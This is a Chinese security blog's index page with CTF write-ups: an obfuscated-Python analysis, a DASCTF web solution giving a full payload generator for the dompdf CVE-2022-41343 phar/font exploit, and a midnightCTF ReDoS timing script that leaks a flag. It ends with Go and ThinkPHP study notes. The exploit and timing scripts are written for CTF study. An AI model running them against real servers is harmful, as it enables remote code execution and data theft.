<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64, os, hashlib, random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_decrypt</span>(<span class="params">encrypted_data, key</span>):</span><br><span class="line">    encrypted_data = base64.b85decode(encrypted_data)</span><br><span class="line">    salt = encrypted_data[:<span class="number">8</span>]</span><br><span class="line">    (key, iv) = derive_key_and_iv(key, salt)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CFB, iv)</span><br><span class="line">    data = cipher.decrypt(encrypted_data[<span class="number">8</span>:])</span><br><span class="line">    <span class="keyword">return</span> data.decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">derive_key_and_iv</span>(<span class="params">password, salt</span>):</span><br><span class="line">    dk = hashlib.pbkdf2_hmac(<span class="string">&#x27;sha256&#x27;</span>, password.encode(), salt, <span class="number">100000</span>)</span><br><span class="line">    key = dk[:<span class="number">16</span>]</span><br><span class="line">    iv = dk[<span class="number">16</span>:]</span><br><span class="line">    <span class="keyword">return</span> (key, iv)</span><br><span class="line"><span class="built_in">print</span>(aes_decrypt(<span class="built_in">list</span>(obfuscate.values())[<span class="number">0</span>], <span class="built_in">list</span>(obfuscate.keys())[<span class="number">0</span>][<span class="number">1</span>:-<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>

<p>嗯哼，这么强的混淆只是为了保护一个解密器的代码。</p>
<h1 id="0x03-复盘"><a href="#0x03-复盘" class="headerlink" title="0x03 复盘"></a>0x03 复盘</h1><p>其实只是破解这个混淆的话，根本不需要上<code>ast</code>来大炮打蚊子，直接把以下内容送进去混淆然后运行:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pdb</span><br><span class="line">pdb.set_trace()</span><br></pre></td></tr></table></figure>
<p><img src="/images/obfuscate/23.png"></p>
<p>dis一下</p>
<p><img src="/images/obfuscate/24.png"></p>
<p>ast分析确实有很多好处的，首先是整个代码的就变得非常直观了，比较适合研究这个混淆的原理，能一眼看出来我这个运行的代码是如何被一步一步拼接出来的，比如这个<code>compile</code><br><img src="/images/obfuscate/25.png"></p>
<p>最后生成分析图像的代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">from</span> graphviz <span class="keyword">import</span> Digraph</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bfs_visit</span>(<span class="params">root</span>):</span><br><span class="line">    queue = Queue()</span><br><span class="line">    queue.put((root, <span class="number">0</span>))</span><br><span class="line">    nodes = []</span><br><span class="line">    g = Digraph(<span class="built_in">format</span>=<span class="string">&#x27;png&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> queue.empty():</span><br><span class="line">        node, pindex = queue.get()</span><br><span class="line">        name = <span class="built_in">str</span>(<span class="built_in">type</span>(node).__name__)</span><br><span class="line">        index = <span class="built_in">len</span>(nodes)</span><br><span class="line">        nodes.append(index)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            value = <span class="built_in">eval</span>(ast.unparse(node))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            value = ast.unparse(node)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            g.node(<span class="built_in">str</span>(index), name+<span class="string">&#x27;  &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">type</span>(value)) + <span class="string">&#x27;  &#x27;</span>+<span class="built_in">str</span>(value))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            g.node(<span class="built_in">str</span>(index), name+<span class="string">&#x27;  &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">type</span>(value)))</span><br><span class="line">        <span class="keyword">if</span> index != pindex:</span><br><span class="line">            g.edge(<span class="built_in">str</span>(index), <span class="built_in">str</span>(pindex))</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> ast.iter_child_nodes(node):</span><br><span class="line">            queue.put((n, index))</span><br><span class="line">    <span class="keyword">return</span> g</span><br><span class="line"></span><br><span class="line">tree = ast.parse(code)</span><br><span class="line">tree = ast.parse(code)</span><br><span class="line">graph = bfs_visit(tree)</span><br><span class="line">graph.render(<span class="string">&quot;obfuscated2_plus&quot;</span>)</span><br></pre></td></tr></table></figure>



<h1 id="Refences"><a href="#Refences" class="headerlink" title="Refences"></a>Refences</h1><p><a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/dis.html">dis — Python 字节码反汇编器</a><br><a target="_blank" rel="noopener" href="https://docs.python.org/3/library/ast.html">ast — 抽象语法树</a><br><a target="_blank" rel="noopener" href="https://qiita.com/kaityo256/items/e83b369ba7518da0a519">Pythonの抽象構文木をGraphvizで可視化する</a></p>
</div><div class="index-category-tag">  <div class="level-item"><i class="fas fa-tags has-text-grey"> </i><a class="article-more button is-small link-muted index-tags" href="/tags/python/">python</a><span> </span><a class="article-more button is-small link-muted index-tags" href="/tags/ast/">ast</a><span> </span><a class="article-more button is-small link-muted index-tags" href="/tags/pyobfuscate/">pyobfuscate</a></div><hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2023-04-25  <a class="commentCountImg" href="/2023/04/25/%E7%A2%8E%E7%A2%8E%E5%BF%B5/#comment-container"><span class="display-none-class">67b38b21f4889fd2668d88d5c6cdb3ba</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="67b38b21f4889fd2668d88d5c6cdb3ba">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>35 分钟  <i class="fas fa-pencil-alt"> </i>5.2 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/04/25/%E7%A2%8E%E7%A2%8E%E5%BF%B5/">碎碎念</a></h1><div class="content">Here's something encrypted, password is required to continue reading.</div><div class="index-category-tag">  <hr></div><div class="level is-mobile is-flex"><div class="level-start"><div class="level-item"><a class="article-more button is-small size-small" href="/2023/04/25/%E7%A2%8E%E7%A2%8E%E5%BF%B5/#more">阅读更多&gt;&gt;</a></div></div><div class="level-start"><div class="level-item has-text-grey is-size-7"><time datetime="2023-04-24T16:46:45.408Z"><i class="far fa-calendar-check"> 最后修改: </i>2023-04-25</time></div></div></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2023-04-24  <a class="commentCountImg" href="/2023/04/24/DasctfSU6%E6%9C%88%E8%B5%9B/#comment-container"><span class="display-none-class">218ebf3aa3744b5ab8229e5a15bf5cd7</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="218ebf3aa3744b5ab8229e5a15bf5cd7">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>2 分钟  <i class="fas fa-pencil-alt"> </i>0.3 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/04/24/DasctfSU6%E6%9C%88%E8%B5%9B/">DasctfSU6月赛</a></h1><div class="content"><h1 id="【困难】pdf-converter"><a href="#【困难】pdf-converter" class="headerlink" title="【困难】pdf_converter"></a>【困难】pdf_converter</h1><p>非预期，<br><img src="/images/1.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public static function invokeFunction($function, $vars = [])</span><br><span class="line">&#123;</span><br><span class="line">    $reflect = new \ReflectionFunction($function);</span><br><span class="line">    $args    = self::bindParams($reflect, $vars);</span><br><span class="line"></span><br><span class="line">    // 记录执行信息</span><br><span class="line">    self::$debug &amp;&amp; Log::record(&#x27;[ RUN ] &#x27; . $reflect-&gt;__toString(), &#x27;info&#x27;);</span><br><span class="line"></span><br><span class="line">    return $reflect-&gt;invokeArgs($args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接日进去了</p>
<p>预期解:</p>
<p>CVE-2022-41343</p>
<p>当时都搜到了qwq</p>
<p><code>http://buaq.net/go-129526.html</code></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">PAYLOAD_TEMPLATE_URL_ENCODED = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;style&gt;@font-face+&#123;+font-family:&#x27;exploit&#x27;;+src:url(&#x27;%s&#x27;);+font-weight:&#x27;normal&#x27;;+font-style:&#x27;normal&#x27;;&#125;&lt;/style&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">PAYLOAD_TEMPLATE = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;style&gt;</span></span><br><span class="line"><span class="string">    @font-face &#123;</span></span><br><span class="line"><span class="string">        font-family:&#x27;exploit&#x27;;</span></span><br><span class="line"><span class="string">        src:url(&#x27;%s&#x27;);</span></span><br><span class="line"><span class="string">        font-weight:&#x27;normal&#x27;;</span></span><br><span class="line"><span class="string">        font-style:&#x27;normal&#x27;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&lt;/style&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_args</span>():</span><br><span class="line">    parser = argparse.ArgumentParser( prog=<span class="string">&quot;generate_payload.py&quot;</span>,</span><br><span class="line">                      formatter_class=<span class="keyword">lambda</span> prog: argparse.HelpFormatter(prog,max_help_position=<span class="number">50</span>),</span><br><span class="line">                      epilog= <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">                       This script will generate payloads for CVE-2022-41343</span></span><br><span class="line"><span class="string">                      &#x27;&#x27;&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;file&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Polyglot File&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-p&quot;</span>, <span class="string">&quot;--path&quot;</span>, default=<span class="string">&quot;/var/www/&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Base path to vendor directory (Default = /var/www/)&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">return</span> args</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    args = get_args()</span><br><span class="line">    file = args.file.strip()</span><br><span class="line">    path = args.path.strip()</span><br><span class="line">    <span class="keyword">if</span>(os.path.exists(file)):</span><br><span class="line">        generate_payloads(file, path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ERROR: File doesn&#x27;t exist.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_payloads</span>(<span class="params">file, path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        fc = f.read()</span><br><span class="line">    b64 = base64.b64encode(fc)</span><br><span class="line">    data_uri_pure = <span class="string">&quot;data:text/plain;base64,%s&quot;</span> % b64.decode()</span><br><span class="line">    md5 = hashlib.md5(data_uri_pure.encode()).hexdigest()</span><br><span class="line">    data_uri_double_encoded = <span class="string">&quot;data:text/plain;base64,%s&quot;</span> % urllib.parse.quote_plus(urllib.parse.quote_plus(b64.decode()))</span><br><span class="line">    phar_uri = <span class="string">&quot;phar://%s/vendor/dompdf/dompdf/lib/fonts/exploit_normal_%s.ttf##&quot;</span> % (path,md5)</span><br><span class="line">    req1_enc = PAYLOAD_TEMPLATE_URL_ENCODED % data_uri_double_encoded</span><br><span class="line">    req2_enc = PAYLOAD_TEMPLATE_URL_ENCODED % urllib.parse.quote_plus(phar_uri)</span><br><span class="line">    req1_pure = PAYLOAD_TEMPLATE % data_uri_double_encoded</span><br><span class="line">    req2_pure = PAYLOAD_TEMPLATE % phar_uri</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;====== REQUEST 1 ENCODED =======&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(req1_enc)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;====== REQUEST 2 ENCODED =======&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(req2_enc)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;====== REQUEST 1 NOT ENCODED =======&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(req1_pure)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;====== REQUEST 2 NOT ENCODED =======&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(req2_pure)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><div class="index-category-tag">  <div class="level-item"><i class="fas fa-tags has-text-grey"> </i><a class="article-more button is-small link-muted index-tags" href="/tags/%E5%A4%8D%E7%8E%B0/">复现</a><span> </span><a class="article-more button is-small link-muted index-tags" href="/tags/web/">web</a><span> </span><a class="article-more button is-small link-muted index-tags" href="/tags/ThinkPHP/">ThinkPHP</a></div><hr></div></article></div><!--!--><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2023-04-14  <a class="commentCountImg" href="/2023/04/14/Redos/#comment-container"><span class="display-none-class">60e7fabdee214ab2a5a51559fd2dd056</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="60e7fabdee214ab2a5a51559fd2dd056">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>2 分钟  <i class="fas fa-pencil-alt"> </i>0.3 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/04/14/Redos/">redos</a></h1><div class="content"><p>midnightCTF，有这么一道题，很是神奇(</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// include_once(&#x27;./flag.php&#x27;);</span></span><br><span class="line"><span class="variable">$FLAG</span> = <span class="string">&quot;flag&#123;Test_very_very_very_long_flag&#125;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$startTime</span> = <span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>].<span class="string">&#x27;/&#x27;</span>, <span class="variable">$FLAG</span>, <span class="variable">$matches</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$endTime</span> = <span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$runTime</span> = <span class="variable">$endTime</span> - <span class="variable">$startTime</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&lt;br /&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;strong&gt;Exec Time:&lt;/strong&gt; &quot;</span>.<span class="variable">$runTime</span>.<span class="string">&quot;&lt;br /&gt;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>起初是认为正则表达式<code>/e</code>能命令执行，赛后复现的时候才发现是Redos</p>
<p><a target="_blank" rel="noopener" href="https://regex101.com/">肥肠好用的正则表达式工具</a></p>
<p>原理很简单，就是利用回溯、贪婪等方式，让正则表达式进行一个大量的工作，这样就产生了一个时间延迟，于是乎就可以直接开始注入了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">small = [<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>) + <span class="number">1</span>)]</span><br><span class="line">small += [<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>) + <span class="number">1</span>)]</span><br><span class="line">small += [<span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;-&quot;</span>,<span class="string">&quot;_&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> small:</span><br><span class="line">        _tmp = &#123;&#125;    </span><br><span class="line">        u = <span class="string">f&quot;http://127.0.0.1/midnight.php/?x=<span class="subst">&#123;ans + i&#125;</span>|(a*(b*(c*(d*(e*(f*.*.*.*.*.*.*.*.*.*.*.*.*(g*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*(].*.*.*.*.*.*.*.*.*.*.*))))))))&quot;</span></span><br><span class="line">        r = requests.get(u)</span><br><span class="line">        html = etree.HTML(r.text)</span><br><span class="line">        time = html.xpath(<span class="string">&quot;/html/body/text()&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">        _tmp_time = <span class="built_in">eval</span>(time)</span><br><span class="line">        <span class="keyword">if</span> _tmp_time &lt;<span class="number">0.0005</span>:</span><br><span class="line">            <span class="built_in">print</span>(i,time)</span><br><span class="line">            ans += i</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"><span class="comment"># print(timemap[timelist.sort(reverse=True)[0]])</span></span><br></pre></td></tr></table></figure></div><div class="index-category-tag">  <div class="level-item"><i class="fas fa-tags has-text-grey"> </i><a class="article-more button is-small link-muted index-tags" href="/tags/%E5%A4%8D%E7%8E%B0/">复现</a><span> </span><a class="article-more button is-small link-muted index-tags" href="/tags/regex/">regex</a><span> </span><a class="article-more button is-small link-muted index-tags" href="/tags/DOS/">DOS</a><span> </span><a class="article-more button is-small link-muted index-tags" href="/tags/midnight/">midnight</a></div><hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2023-04-08  <a class="commentCountImg" href="/2023/04/08/Go%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/#comment-container"><span class="display-none-class">78eec0fa18e61da0f7adc56e4c674396</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="78eec0fa18e61da0f7adc56e4c674396">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>3 分钟  <i class="fas fa-pencil-alt"> </i>0.5 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/04/08/Go%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">Go编程学习记录</a></h1><div class="content"><h1 id="go-mod"><a href="#go-mod" class="headerlink" title="go mod"></a>go mod</h1><p>Go.mod是Golang1.11版本新引入的官方包管理工具用于解决之前没有地方记录依赖包具体版本的问题，方便依赖包的管理。</p>
<p>Go.mod其实就是一个Modules，关于Modules的官方定义为：</p>
<p>Modules是相关Go包的集合，是源代码交换和版本控制的单元。go命令直接支持使用Modules，包括记录和解析对其他模块的依赖性。Modules替换旧的基于GOPATH的方法，来指定使用哪些源文件。</p>
<p>Modules和传统的GOPATH不同，不需要包含例如src，bin这样的子目录，一个源代码目录甚至是空目录都可以作为Modules，只要其中包含有go.mod文件。</p>
<h1 id="go-tidy"><a href="#go-tidy" class="headerlink" title="go tidy"></a>go tidy</h1><h1 id="fmt-输入输出"><a href="#fmt-输入输出" class="headerlink" title="fmt 输入输出"></a>fmt 输入输出</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">fmt.Printf(format string, a ...interface&#123;&#125;)：类似于 C 语言中的 printf 函数，可以格式化输出字符串。</span><br><span class="line">fmt.Println(a ...interface&#123;&#125;)：将参数 a 按顺序输出到控制台，并在最后追加一个换行符。</span><br><span class="line">fmt.Sprintf(format string, a ...interface&#123;&#125;)：将参数 a 按指定格式 format 进行格式化，并以字符串形式返回结果。</span><br><span class="line">fmt.Errorf(format string, a ...interface&#123;&#125;)：创建一个新的 errors 错误实例，并将错误信息按指定格式 format 进行格式化。</span><br><span class="line">fmt.Scan(a ...interface&#123;&#125;)：从标准输入中读取参数 a，并将其赋值给变量。</span><br><span class="line">fmt.Scanf(format string, a ...interface&#123;&#125;)：从标准输入中按照指定格式 format 读取参数 a，并将其赋值给变量。</span><br><span class="line">fmt.Sprintln(a ...interface&#123;&#125;)：将参数 a 按顺序转换为字符串并添加换行符，返回结果字符串。</span><br><span class="line">fmt.Errorf(format string, a ...interface&#123;&#125;)：将参数 a 按指定格式 format 进行格式化，并返回一个 error 类型的错误实例。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id=""><a href="#" class="headerlink" title=""></a></h1></div><div class="index-category-tag"><div class="level-item"><i class="fas fa-folder-open has-text-grey"> </i><a class="article-more button is-small link-muted index-categories" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></div>  <div class="level-item"><i class="fas fa-tags has-text-grey"> </i><a class="article-more button is-small link-muted index-tags" href="/tags/Go/">Go</a></div><hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2023-04-05  <a class="commentCountImg" href="/2023/04/05/ThinkPHP%E5%AD%A6%E4%B9%A0%E5%AF%84%E5%BD%95/#comment-container"><span class="display-none-class">226c698381629685ad8aff24bc707b46</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="226c698381629685ad8aff24bc707b46">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>28 分钟  <i class="fas fa-pencil-alt"> </i>4.2 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/04/05/ThinkPHP%E5%AD%A6%E4%B9%A0%E5%AF%84%E5%BD%95/">ThinkPHP框架 3.2.3学习记录</a></h1><div class="content"><h1 id="ThinkPHP-3-2-3"><a href="#ThinkPHP-3-2-3" class="headerlink" title="ThinkPHP 3.2.3"></a>ThinkPHP 3.2.3</h1><p>目录结构</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">├─index.php       入口文件</span><br><span class="line">├─README.md       README文件</span><br><span class="line">├─Application     应用目录</span><br><span class="line">├─Public          资源文件目录</span><br><span class="line">└─ThinkPHP        框架目录</span><br></pre></td></tr></table></figure>

<p>其中框架目录ThinkPHP的结构如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">├─ThinkPHP 框架系统目录（可以部署在非web目录下面）</span><br><span class="line">│  ├─Common       核心公共函数目录</span><br><span class="line">│  ├─Conf         核心配置目录 </span><br><span class="line">│  ├─Lang         核心语言包目录</span><br><span class="line">│  ├─Library      框架类库目录</span><br><span class="line">│  │  ├─Think     核心Think类库包目录</span><br><span class="line">│  │  ├─Behavior  行为类库目录</span><br><span class="line">│  │  ├─Org       Org类库包目录</span><br><span class="line">│  │  ├─Vendor    第三方类库目录</span><br><span class="line">│  │  ├─ ...      更多类库目录</span><br><span class="line">│  ├─Mode         框架应用模式目录</span><br><span class="line">│  ├─Tpl          系统模板目录</span><br><span class="line">│  ├─LICENSE.txt  框架授权协议文件</span><br><span class="line">│  ├─logo.png     框架LOGO文件</span><br><span class="line">│  ├─README.txt   框架README文件</span><br><span class="line">│  └─ThinkPHP.php 框架入口文件</span><br></pre></td></tr></table></figure>

<h2 id="入口文件"><a href="#入口文件" class="headerlink" title="入口文件"></a>入口文件</h2><p>入口文件是应用的单一入口，对应用的所有请求都定向到应用入口文件，系统会从URL参数中解析当前请求的模 块、控制器和操作</p>
